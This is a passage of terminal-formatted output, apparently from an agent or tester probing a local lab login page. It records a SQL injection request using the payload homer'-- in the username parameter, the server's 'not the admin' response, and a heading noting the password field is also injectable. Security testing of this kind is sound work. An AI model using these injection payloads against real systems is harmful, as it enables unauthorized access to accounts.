[32m│[0m **Request 3 - Multiple users confirmed (homer'-- ):**                        [32m│[0m
[32m│[0m ```                                                                          [32m│[0m
[32m│[0m GET /index.php?username=homer'--&password= HTTP/1.1                          [32m│[0m
[32m│[0m Host: 127.0.0.1:32895                                                        [32m│[0m
[32m│[0m ```                                                                          [32m│[0m
[32m│[0m Response: `<center><h3>Oh Sorry but...you are not the admin :(               [32m│[0m
[32m│[0m </h3></center>`                                                              [32m│[0m
[32m│[0m                                                                              [32m│[0m
[32m│[0m **Request 4 - Password field also vulnerable:**                              [32m│[0m
[32m│[0m ```                                                                          [32m│[0m
